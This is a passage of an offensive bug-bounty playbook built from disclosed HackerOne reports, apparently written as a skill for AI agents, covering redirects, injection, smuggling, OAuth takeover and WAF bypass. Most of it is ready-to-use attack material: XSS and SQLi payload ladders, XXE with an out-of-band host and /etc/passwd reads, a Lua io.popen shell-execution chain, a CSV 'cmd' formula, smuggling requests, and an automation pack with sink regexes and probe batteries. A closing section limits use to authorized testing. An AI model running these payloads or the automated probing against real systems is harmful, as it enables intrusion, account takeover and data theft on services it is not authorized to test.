**`3723458` (Khan Academy, critical):** `KA_DOMAIN_REGEX = /(^|\.)(khanacademy\.(org|dev|test|local)|kastatic\.org|.*-6fmjyrz2lq-uc.a.run.app)$/` — unescaped dots, source found via leaked sourcemap (`khanacademy.<hash>.js.map` → `libs/urls/src/regexp.ts`); attacker registered `xfarr-6fmjyrz2lq-uc-a-run.app`; `login?continue=<evil>` triggered `maybeAddAuthTransfer()` → one-time transfer token to attacker URL (`/transfer_auth?key=<TOKEN>`) — token unconsumed (victim JS never runs on evil domain) → replay on any `*.khanacademy.org` → full cookies (`KAAS/KAAL/KAAC`) as victim (students incl. minors — COPPA/FERPA blast radius). Fix: escape the dots; stop shipping sourcemaps.

**`108113` (Digits/Twitter):** `callback_url=https://attacker.com%ff@www.periscope.tv` passed hostname validation, then `%ff` → `?` in the emitted `Location` header flipped authority into query → OAuth creds to attacker → account takeover on every Digits-integrated app.

**`1047447`:** `sanitize_string` regex + `#fragment` (`http://google.com#sub.tkte.ch/`) confusion.

**`103772`:** `checkout_url=.np` dot-prefix rode an authenticated login redirect off-domain.

**`104087` (Slack):** SVG `onload="window.location=…"` as redirect primitive where uploads allowed.

### Hunt checklist

- [ ] `//evil`, `https:evil`, `\/evil`, `\\evil`, `%5c`
- [ ] `whitelist.evil`, `evil#whitelist`
- [ ] `javascript:` / `data:` schemes
- [ ] `%09` / `%0d` prefixes
- [ ] Non-ASCII (`%ff`, IDN)
- [ ] `?next=` + parameter pollution
- [ ] Port/case/trailing-dot variants
- [ ] **OAuth/SSO params first** (they decide ATO)
- [ ] **Always chain:** redirect → `code`/token leak → XSS → login-CSRF landing

---

## 15. Information disclosure

> **849 usable reports, avg $206**

### Root cause

Over-exposed APIs/attachments/exports/websockets; missing object auth on read paths; rewriters/proxies with gaps; edge-vs-origin auth drift.

### Case files

| Report | Technique | Detail |
| --- | --- | --- |
| `1061292` | Unauthenticated API | `pendingUserDetails/2634` + `getAttachmentBytes/<id>` unauthenticated |
| `1007988` | Cross-user access | Someone else's Drive-linked messages viewable/commentable |
| `1023669` | WebSocket eavesdrop | Staff-without-permissions listening to customer conversions on `wss://argus.shopifycloud.com/graphql?shop_id={id}` |
| `1021885` | Attribute bypass | `srcset`/`manifest`/`profile` bypass of Hey's tracker-proxy ($1,000) |
| `1023572` | Host swap | aura endpoint honored swapped `Host` (`acronis.secure.force.com`) + retargeted path |
| `703882` | Origin bypass | Cloudflare-fronted origin found via cert/Censys → direct-IP reads without edge auth/WAF |
| `1010858` | Cache disclosure | Cache-poisoning writeup doubling as disclosure primitive |
| `111752` | BREACH-shape | `/signin/` + HTTP compression + reflected input + reflected secret, with full mitigation set |

### Hunt checklist

- [ ] Auth-drop replay on every JSON/attachment/export/websocket endpoint
- [ ] Sequential-ID sweep
- [ ] GraphQL introspection + alternate-query-per-object + staff-vs-anon diff
- [ ] Rewriter attribute census
- [ ] `Host`/`X-Forwarded-Host` swaps
- [ ] Verbosity dials (`?debug=1`, bad IDs, `\u0000` error-bait per `1000567`)
- [ ] Origin-IP hunt (§26) — origins routinely lack the edge's auth

---

## 16. Business logic, race conditions, rate limits

> **253 usable reports, avg $234**

### Root cause

Trust in client-supplied amounts/plans/quantities/steps; non-atomic check-then-act; counters that resend/parallelism resets; filters with uncovered attributes.

### Case files

| Report | Technique | Detail |
| --- | --- | --- |
| `1029027` | Normalization gap | Leading space in icon name (`" "` + paid name) served paid avatars free — trim/normalize gaps are logic bugs (Imgur) |
| `1047100` | Rate limit absence | No rate limit on data-create (`projectId=` + `X-XSRF-TOKEN` replayable) (Stripo) |
| `1021776` | Amount tamper | `POST /create-payment {"merchant":"cardpay","amount":10}` → order-ID/URL flow — amount/merchant tamper surface (cs.money) |
| `1021885` | Filter bypass | `srcset` as logic-filter bypass (privacy control defeated by uncovered attribute) |
| `1065493` | DNS TOCTOU | Double-resolution DNS |
| `1019457` | Resolver race | `getaddrinfo` race under helgrind (curl) |
| `1040047` | Verification bypass | Invite/verify link usable from another browser — verification bound to link, not to session/requester |
| `244636` | Email swap | `confirm_email` body email swap |
| `2028450` | Direct API call | Delete-after-leave via direct API |

### Hunt checklist

- [ ] Tamper price/qty/role/plan/currency (negatives, zero, spaces, case, array-vs-scalar, K/M suffixes)
- [ ] Coupon/referral reuse+stack+reorder (redeem→cancel→redeem) and parallel redeem (Turbo Intruder 10–20×)
- [ ] OTP/resend/verify matrix
- [ ] Workflow skipping (`/step3` directly, method swap, webhook replay with neighboring `projectId`)
- [ ] Invite/confirm binding (link vs session vs email)
- [ ] Normalization gaps (space/case/unicode/duplicate params)

---

## 17. OS command, SSTI/template, XXE, deserialization, CSV/formula injection

### OS command injection

> **163 generic at $873 + 45 OS-specific at $515 — highest web means**

Shell metachars in ping/traceroute/export/screenshot/schedule fields; time oracles (`;sleep N`, `|sleep`, `%0asleep`).

**`1401444` ($3,000, GitLab):** Wiki `mediawiki` format rendered by WikiCloth; `<lua>` extension active when `rubyluabridge` requirable; sandbox used `loadstring` + `setfenv(getfenv(2))` — the officially-documented-unsafe pattern — so `_,execute = pcall(loadstring, [[ io.popen(command) … ]]); print(execute('id'))` ran shell as the app user from a wiki page.

**`1327701`:** `/pages/createpage-entervariables.action` `queryString=…\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027)…` (Confluence-style EL) plus `; ls` commit-filename write primitive in the same report — **always test both read and write.**

**`1217114`:** `sleep`/`benchmark` WAF-blocked → read how input executes (found a `ping` path) for the alternate oracle.

### SSTI/template injection

> **333 marker hits**

`{{7*7}}`, `${7*7}`, `<%= %>`, `#{ }`, `__class__/mro()/subclasses()` in names, subjects, PDF filenames, preview URLs, webhook templates; `1057531`'s `url={{}}` is the probe shape. Escalate Jinja/Twig → `__class__.__mro__[2].__subclasses__()` → `popen`; Smarty/Twig sandboxes → tag-allowlist diffing.

### XXE

> **33 hits**

**`105980` (ownCloud VPN login, `Content-type: application/xml`):** `<!DOCTYPE a [<!ENTITY % select SYSTEM "http://wallarm.tools/ok"> %select;]>` — scanner-found (`wlrm-scnr`), server-fetched (access-log `GET /ok`) — the loop is scan XML content-types, confirm OOB, then `file:///etc/passwd` / `expect://` / `php://filter`. Try login/SAML/SVG/Office/XML-import endpoints; error-bait with `\u0000`.

### Deserialization

> **32 reports, avg $376**

| Report | Technique | Detail |
| --- | --- | --- |
| `1174185` | Telerik CVE-2019-18935 | File-upload returned encrypted blob (`RAU_crypto.bypass`) → crypto oracle → weaponized `machineKey` → RCE via crafted `.dll` (`Sleep(10000)` DllMain PoC) |
| `2334460` | Airflow pickle | XCom pickle-poisoning past `enable_xcom_pickling=False` |
| `1119120` | Ruby Marshal | `Marshal.dump([Gem::SpecFetcher, … TarReader::Entry … @socket …])` gadget chain with null-byte segments |
| `1063039` | Concrete CMS | Request-driven logging-handler/mode switch → code path control |

**Smells:** `signed_id`-style blobs, `state`/`data` params, Java `readObject`, PHP `unserialize`/phar paths, Python pickle endpoints, Node `__proto__` merges (§24).

### CSV/formula injection

> **The fix-bypass trilogy: `72785` → `111192` → `118582`**

**`111192` (HackerOne itself):** Prior fix stripped leading `=+-@`; bypass = leading newline `%0A-2+3+cmd|' /C calc'!D2` in the report title — exported CSV cell went live on open.

**`118582`:** Bypassed *that* mitigation in turn.

**Lesson:** Fixes that strip a prefix-set without stripping whitespace/control chars (`\n`, `\r`, `\t`, `,`, `;`, `|`) lose; test every cell entry-point (titles, names, addresses) **and** every export (CSV, XLS, SYLK) — payload must start with `=+-@` after the app's own normalization.

---

## 18. Path traversal, file read, file upload

> **185 usable reports, avg $600**

### Traversal

| Report | Technique | Detail |
| --- | --- | --- |
| `1004007` | Tomcat bypass | `..;` past Tomcat guards |
| `1394916` | Apache path confusion | Apache 2.4.49 (CVE-shaped — version-scan + `/.%%32%65/`-family) |
| `1408692` | Path alias | Nextcloud Android: upload-path check `startsWith("/data/data")` beaten by `/data/user/0/…` alias |
| `1070247` | Write primitive | Phabricator: `git log … --output=/tmp/qqq` + attacker-influenced ref → arbitrary **write** (traversal that lands a write beats a read) |
| `1888808` | File fallback | WAF blocked `/etc/passwd` but allowed `hosts` — different-file fallbacks + encoding ladder |

**Encoding ladder:** `..;/`, `....//`, `%2e%2e/`, `%252e`, `..%c0%af`, absolute paths, null byte, `file:` scheme.

### Upload

**Serve-triple decides impact:** `Content-Type` + `Content-Disposition` + CSP.

- SVG polyglots (`100565`)
- Double extensions (`.php5/.phtml/.phar`)
- MIME spoof (`image/svg+xml`)
- `filename` XSS (`1010466`)
- `Content-Type: image/jpg` with body `true` smuggling past validators (`1040786`'s mirror upload)

If forced-download, try: admin preview, `<img>`/`<embed>` inclusion, traversal-to-reach, and every **other** consumer of the file (thumbnails, PDF converters, AV unpackers).

---

## 19. JWT, OAuth, SSO, session-token logic

### Service-token/JWT chains

**`1040786` ($10,000 — full walkthrough in §11):** Internal upload JWT echoed to the caller; internal headers (`Geo-GL-Id`) trusted from outside; two URL parsers disagreeing.

**Lessons:**
- Harvest tokens from **any** authenticated response (upload echoes, debug endpoints, error pages)
- Replay internal-only headers from the outside
- Brute-force incremental key IDs
- Hunt parser-A/parser-B gaps at every proxy boundary

**Generic JWT battery:**
- `alg:none`
- `kid` traversal/SQLi
- `jku`/`x5u` to attacker
- Weak-secret brute
- Role-claim edit
- Cross-service `iss`/`aud` confusion

### OAuth/SSO account takeover

| Report | Technique | Detail |
| --- | --- | --- |
| `108113` + `3723458` | Validation→use gaps | See §14 |
| `1212374` | Silent merge | Reddit: OAuth-login with the same Gmail silently merged into/took over the existing email account — email-only ATO; fix is verified-linking, never silent merge |
| `101977` | Cross-app confusion | Foreign Facebook-app `access_token` accepted at Imgur's token endpoint |
| `1439552` | State bypass | `state` bypass + unscoped Pages cookie (§11) |
| `1018489` | IdP binding | Injected `/accounts/{victim}/external-login/1` link bound attacker's IdP to victim flow |

**Battery:**
- `redirect_uri` strictness (exact-match? fragment/port/case/IDN?)
- `state` presence+binding+single-use
- `code` leakage (referrer/logs/redirect)
- Silent-merge test (register email → OAuth same email → whose session?)
- Cross-app token replay
- `response_mode`/`grant` downgrades

---

## 20. Cache poisoning/deception, smuggling, CRLF/header injection, clickjacking

### Cache poisoning/deception

> **402 hits**

| Report | Technique | Detail |
| --- | --- | --- |
| `1760213` | Cookie cache poison | Stored-XSS-via-`hav`-cookie + `</sc"ript>` WAF rejoin |
| `1025575` | Framework cache | Fastify + CDN/cache combo |
| `1010858` | Cache poisoning | Acronis cache-poisoning writeup |

**Battery:** Unkeyed inputs (`Host`, `X-Forwarded-Host/Port/Proto`, `X-Original-URL`, `utm_*`, `_method`, cookies) → reflection → victim-cache-hit; deception (`/account.css`, `/profile.json`, path-confusion) for destructive cache-store; `X-Cache`/`Age`/`CF-Cache-Status` as oracles.

### HTTP Request Smuggling

> **47 reports, avg $585**

**`1002188` (Node.js, CVE-2020-8287):** Duplicate `Transfer-Encoding` headers — Node honored the first, proxies the other → TE-TE desync past haproxy's `/flag` ACL with smuggled `GET /flag`.

**`1063493` (Acronis sandbox):** `Transfer-Encoding<TAB>:<TAB>chunked` (tab, not space; base64 your probe to preserve it) + exact body-length math (93 bytes incl. smuggled `POST /sf` with Collaborator `Host`) → mass-redirect of poisoned-queue victims via `/sf`'s Host-driven redirect.

**Battery:** CL.TE/TE.CL/TE.TE, late/duplicated `Transfer-Encoding`, tab/vertical-whitespace header names, `Content-Length` + chunked both present, `0\r\n\r\nGET` prefix, desync-to-cache and desync-to-redirect upgrades per PortSwigger's playbook.

### CRLF/header injection

> **167 header-inject hits**

| Report | Technique | Detail |
| --- | --- | --- |
| `3133379` | Proxy header CRLF | CRLF in curl `--proxy-header` → proxy/WAF-rule bypass + `X-Forwarded-For`/`Authorization` spoof + log poison |
| `3479203` | QPACK CRLF | CRLF in HTTP/3 QPACK conversion → downstream WAF/proxy desync, cache poison, session fixation |
| `1098948` | Host manipulation | `Host` manipulation on a redirector (kartpay) |
| `251572` | Null byte | Null byte in `url` broke the `Refresh` header → redirect died, injected HTML rendered (WAF had blocked the XSS; the header-break salvaged HTML injection) |

**Battery:** `%0d%0a` (+ double-encoded, +unicode) in every reflected-into-header value; `X-Forwarded-Host/For`, `X-Original-URL`/`X-Rewrite-URL` for routing/auth decisions; `Referer`/`User-Agent` where responses echo or log them.

### Clickjacking

> **93 reports, $62 — chain-only**

Missing `X-Frame-Options`/CSP `frame-ancestors` + one-click sensitive action (OAuth authorize, email change, payment, API-key reveal). Always transparent-overlay PoC; always pair with another primitive.

---

## 21. DoS, ReDoS, resource consumption

> **403 usable reports, avg $572**

### Case files

**`1000567` (cs.money, $250):** GraphQL `search(q:)` interpolated input into a server regex — error-bait `\u0000` leaked the pattern (`value (?=.*\u0000) must not contain null bytes`, then `Invalid regular expression: /(?=.*X))/`) → regex-bomb `([a-zA-Z0-9]+\s?)+$|^([a-zA-Z0-9.'\w\W]+\s?)+$` vs baseline `"AAA"` (264ms traced) — response-time differential as the whole PoC, with `tracing.duration` as oracle.

**`1019457` (curl):** `getaddrinfo` race under valgrind/helgrind.

**`1065493`:** DNS double-resolution abuse for DDoS.

### Battery (throttled, math-first)

- ReDoS (`(a+)+$`, nested quantifiers) on search/regex params with baseline-vs-payload timing
- GraphQL deep-nesting/alias-batching/introspection floods
- Unbounded pagination (`first:100000`)
- ZIP/SVG bombs
- Hash-collision keys
- Compression-ratio abuse

**Report with resource math and `tracing` deltas, never outage** — and note `1005421`'s cookie `Max-Age=1000000000000000000000` class (integer/overflow-shaped parser abuse adjacent to DoS).

---

## 22. Supply chain — dependency confusion, registries, install scripts

> **The $9k–$11.5k class**

### Case files

**`1043385` (LY Corp, $11,500, critical):** Private npm registry misconfigured → same-name higher-version attacker package on the public registry won at build time → install-script arbitrary code on build hosts.

**`1007014` (Uber, $9,000, critical):** Identical shape.

### Battery

1. **Enumerate private package names** (sourcemaps, error stacks, `package-lock`/`yarn.lock` in repos, mobile bundles, career-page engineering blogs)
2. **Check public registry** for same name + higher semver
3. **Confirm scope/fallback order** (`npmrc`, proxy registries, `pip --extra-index-url`, Maven/Gradle, Go proxy)
4. **Do not publish hostile payloads** — claim-squat with a benign canary + report (both paid reports here were resolved on configuration + version-pinning evidence)

**Adjacent:** `1039504` (`wget http://…` in build scripts — HTTP-fetch in CI), `107296` (timing-oracle in update checks — supply-chain-adjacent crypto hygiene).

---

## 23. Client-side RCE surface — Electron, deep links, rich previews

### Case file

**`1016966` (Basecamp Windows Electron):** Downloads auto-opened when (internal-URL ∧ `text/calendar` MIME ∧ `?attachment=true`); internal-domain regexes `launchpad\.(?:dev|test)` and `3\.(?:staging\.)?basecamp\.com` unanchored → `launchpad.dev.attacker.com` passed; attacker Flask served `file.exe` as `text/calendar` → RCE on click.

### Battery

- Unanchored allow-regexes (see Law 2)
- MIME-allowlist vs sniffing gaps
- Auto-open/download-dir behaviors
- Deep-link handlers (`app://`, custom schemes) with parameter injection
- Rich-preview fetchers (SSRF-adjacent)
- Update-channel hijack

Same regex discipline as server side — test prefix/suffix/dot-substitution on every client allow-list.

---

## 24. Misconfiguration and secure-design failures

### Origin-IP / edge bypass

> **Paid repeatedly**

| Report | Target | Technique |
| --- | --- | --- |
| `1105673` | 3d.cs.money | Origin bypass |
| `1327443` | sifchain | Censys `ipv4?q=` → `52.88.198.160` served the app without Cloudflare |
| `1536299` | — | Censys-found origin → unfiltered payloads + direct DoS |
| `360825` | liberapay | Origin via cert correlation |
| `703882` | — | Cloudflare-fronted origin via cert transparency |

**Procedure:** `crt.sh` + Censys/Shodan/favicons/MX/SPF/history → candidate origins → `Host`-pinned direct-IP request → compare body/headers → replay blocked payloads unfiltered.

`168165` is the same law at DNS level (unprotected `secnews.wpengine.com`).

### CORS

**`1005374`:** Reflected `Origin` + credentials on `wp-json` → cookie-reading PoC.

**`1001951` (TikTok Ads):** Ads-portal endpoint CORS bypass → ticket-info read on victim click (team-confirmed).

**Battery:** evil/null/subdomain origins × credentialed/anonymous; `null` + sandbox iframes; subdomain-takeover → trusted-origin upgrade (`1018790`).

### GraphQL

| Report | Technique | Detail |
| --- | --- | --- |
| `1000567` | ReDoS + error-bait | See §21 |
| `1023669` | WebSocket eavesdrop | Staff websocket `graphql?shop_id=` |
| `1084939`/`1091380` | Alternate query | Alternate-query object access |
| `2509022` | Mutation abuse | Mutations as ATO primitives |

**Battery:** Introspection/`__schema`, field-suggest enumeration, batching/alias abuse for brute-force and DoS, per-resolver auth matrix (same object, every query/mutation, three roles), subscription/webhook sinks, error-verbosity maxing.

### Prototype pollution

> **55 hits**

**`1001218` (`@firebase/util` 0.3.2, 1.5M weekly downloads):** `deepCopy`/`deepExtend` merged `JSON.parse('{"__proto__":{"polluted":"yes"}}')` onto `Object.prototype` — `({}).polluted === 'yes'` after one call; impact ladder DoS → property injection → RCE depending on app.

**Battery:** `__proto__`/`constructor.prototype` keys in JSON merges, query parsers, deep-merge libs; confirm `({}).polluted`; escalate via polluted `transportOptions`/`shell`/`command`/`template` keys toward RCE; check client (DOM-debugger sinks) and server (config objects).

### Additional misconfiguration patterns

| Report | Issue | Fix |
| --- | --- | --- |
| `1040047` | Invite/verify links usable cross-browser | Bind to session |
| `15047` | CAPTCHA solved client-side via extension | Replay the check, don't solve the puzzle |
| `1178562` | IMAP StartTLS-strip (CVE-2016-0772 shape) | Downgrade attacks live in mail/IoT |
| `111752` | BREACH-shape triad (compression + reflection + secret) | Canonical fix set |
| `134894` | Anti-CSRF IP-binding via `REMOTE_ADDR` fails behind proxy/WAF/LB | Bind to session, not socket |

---

## 25. Payload and WAF/filter-bypass playbook

> **Order of operations at every sink:** plain → case-mix → whitespace/comment → encoding → alternate handler → alternate context/host. ~40% of paid XSS here needed ≥1 rung.

### XSS ladder

Each rung felled a real filter:

1. **Baseline:** `"><svg onload=alert(1)>`, `"><img src=x onerror=alert(1)>`, `javascript:alert(1)`
2. **Case-mix:** `0xd3adc0de<ScRiPt>alert('XSS Success!')</sCripT>` + HTML- + URL-encode the whole (`1873655`)
3. **Newline-in-scheme:** `<a href="ja%0A%0Dvascript:alert(document.domain)">Click</a>` (`1012249`, noted in-report as the WAF bypass)
4. **Split-tag:** `o<br>nfocus=confirm(1337) autofocus tabindex=1` (`1251868`) and tag-soup `</li></ul>…<test/on…>` (`218226`)
5. **Exotic handlers:** `<h1 onauxclick=confirm(document.domain)>` (`1736432`)
6. **Quote-evasion:** `%u0022 id="injected` (`227486`), `%2522`-in-path (`252908`), quotes-survive `X" onmouseover="alert('XSS')"` (`3241321`)
7. **JS-signature evasion:** `print()` for `alert()` (ASP.NET WAF family `3166579`+), `a=alert;a(1)` (`1184644`), `String['fromCharCode'](104,116,…)` URL-hide (`1010466`)
8. **Comment-prefix:** `<!-->` (`415484`)
9. **Server-rejoin:** `</sc"ript>` (`1760213`), strip-rejoin `onmou<seover`/`ale<rt` (`265528`)
10. **JS-context:** `-20a")});a=alert;a(1);//` (`1184644`)
11. **Click-vectors:** `![…](javascript:eval(atob('…')))` (`2509022`), `javascript://%0a%0dalert(document.cookie)` (`100931`)
12. **mXSS:** `<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert('XSS') src>">` (`1024734`)

### SQLi payloads

- Quote-less `int-sleep(t)` (`1278928`)
- Header points: `Referer: '+(select*from(select(if(1=1,sleep(20),false)))a)+'` (`1018621`)
- `WAITFOR DELAY` + `@@LANGID` (MSSQL, `1034625`/`577612`)
- `pg_sleep`
- Path-segment params (`2633959`)
- Alternate-exec oracle when `sleep` dies (`1217114`)
- sqlmap only after manual timing proof, with tamper for spaces/quotes

### SSRF/redirect payloads

- IP literals: `0.0.0.0`, `127.1`, `2130706433`, `0x7f.1`
- `%c0%ae`/`%252e` dots
- `whitelist%09evil`, `evil@whitelist`
- Overlong-schema parser bugs (`1049624`)
- DNS 302-follow
- Verb tunnels (`3231321`)
- Redirects add: `\\evil`, `%5c`, `.np`-style dot-prefix (`103772`), `#fragment` (`1047447`), non-ASCII `%ff` (`108113`), unescaped-dot domains (`3723458`), `\u0022`/double-encoding (`227486`/`252908`)

### Upload/SVG/template payloads

- SVG-inline triple-check (type/disposition/CSP, `100565`)
- `filename` field (`1010466`)
- `{{7*7}}→__class__.__mro__` ladder
- `<!ENTITY % xxe SYSTEM>` → OOB (`wallarm.tools/ok`, `105980`) → `file:///etc/passwd`/`expect://`/`php://filter`
- CSV `%0A-2+3+cmd|' /C calc'!D2` (`111192`)
- Traversal: `..;/…....//…%2e%2e…%252e…/data/user/0/…` (`1004007`/`1408692`)
- Smuggling: tab-header `Transfer-Encoding<TAB>:` (`1063493`), duplicate-`Transfer-Encoding` (`1002188`)

### OTP/CSRF/cache/headers payloads

- OTP: `000000`, resend-reset, parallel-verify, `X-Forwarded-For` rotation, message oracles
- CSRF: drop-token/GET-ify/`_method`/downgrade-type
- Cache: unkeyed-input census
- Headers: `%0d%0a` + `X-Original-URL`/`X-Rewrite-URL`/`X-Forwarded-Host` routing tricks

---

## 26. WAF-bypass methodology that actually worked

> **Ranked by corpus frequency (45 WAF+bypass reports; 60 WAF contexts)**

### 1. Leave the WAF

Alternate origin/host/method/IP (`168165`, `1850235`, `1105673`, `1327443`, `1536299`, `360825`); origin-hunt via Censys/certs/Shodan/history, then `Host`-pinned direct requests.

### 2. One encoding layer

Double-encoding, unicode, case, newline-schemes, `print()`, `onauxclick` (F5 ASM fell to obfuscated-`eval` + odd handlers, `3135626`; Kona + Auditor fell together, `265528`).

### 3. Feed the sanitizer its blind spot

Strip-rejoin, comment-prefix, `srcset`, quote-hiding (`265528`, `415484`, `1021885`, `1760213`).

### 4. Change the parser

curl-parser bugs (`1049624`, `3403880`), QPACK CRLF (`3479203`), verb tunnels (`3231321`), managed-ruleset gaps (AWS WAF SQLi bypass, `3591725`).

### 5. Smuggle past it

Proxy-header CRLF (`3133379`), CL.TE/TE.TE desyncs.

### 6. Read blocks as signals

WAF 500/TCP-reset on `ORDER BY`/`on*=` (`218226`, `227102`) means **switch rung/host**, never "self-XSS, won't fix" (cf. under-claimed `198218`, `251572`).

---

## 27. AI-agent automation pack

### Sink regexes

Crawl + JS bundles + OpenAPI/GraphQL schemas:

```regex
# URL-fetch params
(url|uri|link|src|href|redirect|callback|webhook|fetch|proxy|image_url|file_url)\s*[=:]

# Object IDs
/api/(users|orders|invoices|tickets)/\d+|user_id|account_id|order_id

# Redirect params
(redirect(_to|_url)?|next=|return_?to|continue=|callback_url|dest(ination)?=|rurl)

# DOM sinks
location\.(hash|search)|document\.referrer|innerHTML|outerHTML|document\.write|postMessage

# Template injection
\{\{|\$\{|<%=|__class__|mro\(\)|<!ENTITY|SYSTEM\s+["'](file|http|expect|php)

# GraphQL
graphql|__schema|query\s*\{|mutation\s

# Upload/auth
multipart|filename\s*=|jwt|\balg\b|kid|jku|oauth|redirect_uri

# Smuggling/proto/metadata
transfer-encoding|content-length.*content-length|__proto__|169\.254\.169\.254

# Sensitive files
BEGIN RSA|PRIVATE KEY|\.git/config|sitemap\.xml|\.map$
```

### Probe battery per sink

One request each, then one-encoded retry:

| Sink type | Probes |
| --- | --- |
| Reflected param | §25 XSS ladder rungs 1–3 |
| Numeric object | swap-ID/drop-auth/method-swap/`.json` |
| URL-fetcher | Collaborator → metadata → `0.0.0.0`/`127.1` → 302-follow |
| Redirect | `//evil` → `\\evil` → `%2522` → non-ASCII → fragment |
| OTP | 5 fast wrong codes (`429`?) → resend → parallel → `000000` |
| Upload | SVG-onload → `filename` XSS → double-ext → MIME-spoof |
| Headers | `X-Forwarded-Host: evil` → `X-Original-URL: /admin` → `%0d%0aSet-Cookie: x=1` |
| GraphQL | introspection → suggest-enum → alias-batch → per-role matrix |
| Regex-gated URL | Law-2 battery |

### Triage prompt

```
Given this exchange + render context, classify:
{XSS-R/XSS-S/DOM, SQLi, SSRF, IDOR, AuthZ, AuthN, CSRF, OpenRedirect,
 InfoDisc, Logic, RCE-adjacent, benign}

Require one exploitability signal.
Propose ONE minimal bypass retry (encoding/handler/host/context) and a 3-step PoC.
Name the closest corpus case (ID + payload shape).
Never emit undisclosed-shaped targets.
```

---

## 28. Report template (write it like the paid reports)

```markdown
## Summary
(impact-first, one breath: ATO / PII / RCE / funds)

## Weakness + Severity
(CWE + why this rating; cite the transferable primitive)

## Root cause
(sink → validation gap → trigger; name the sanitizer/WAF behavior)

## Steps To Reproduce
(numbered, copy-paste: URLs, curl, accounts A/B, clicks)

## Payloads
(fences; note which bypass rung was needed and why)

## Impact
(session/PII/funds scope; GraphQL mutation / conversation-hijack if XSS)

## Supporting Material
(screenshots, video, Collaborator/DNS logs, headers)

## Remediation
(allow-list + encode-on-read + parameterized queries + metadata
 protection + rate limits + anchored regexes + bound tokens + no silent merges)
```

**Best-received reports read like:**
- `3723458` (root-cause-first with source file + line, PoC as numbered attacker/victim steps, fix as diff)
- `1016966` (restrictions listed, then each bypassed in order)

**Chains (`2509022`, `1439552`, `1040786`, `632017`) consistently out-earned singletons — always test one hop further.**

---

## 29. Appendix — reproduce, limits, ethics

### Links

`all-links.txt` (14,759) from `data.csv` (`https://` + stored host/path).

### Fetch

```bash
python3 fetch_reports_json.py --batch N --concurrent 10  # N = 0..29, 500/batch
python3 fetch_reports_json.py --all                       # everything
```

Resume-safe via `report_data/json/<id>.json`; `report_data/fetch_log.csv` + `report_data/undisclosed.txt`.

**Final:** 12,059 readable on disk (81.7%), 2,698 `404-undisclosed-or-gone` ignored, 9,057 usable bodies; §2 stats from usable set.

### Analyze

```bash
python3 analyze_corpus.py    # → analysis_summary.json
python3 analyze_dump.py      # → pertype_dump.txt
python3 analyze_waf.py       # → waf_dump.txt
```

### Limits

- `Unknown` weakness (876 usable) where JSON+CSV lack labels — title-word + pattern census still applies
- Empty/redacted bodies ignored (may include once-paid, since-restricted reports)
- Means un-normalized across currencies
- Payload contexts truncated in dumps (full text in `report_data/md/`)
- Memory-corruption (native) counted but out of web scope
- Two edge files excluded (`832750` empty-body, `151117` OS file-lock on write)

### Ethics/scope

> **CRITICAL: This skill is for authorized security testing only.**

- ✅ In-scope targets only (with explicit program authorization)
- ✅ Throttle blind/time/race/DoS probes
- ✅ Stop SQLi at boolean/time proof
- ✅ Never exfiltrate beyond PoC
- ✅ Honor `429`/`Retry-After` (fetcher already backs off)
- ✅ Dependency-confusion claims use benign canaries
- ❌ Never test without authorization
- ❌ Never access/modify real user data beyond PoC
- ❌ Never disclose vulnerabilities publicly before fix
- ❌ Never use findings for malicious purposes

---

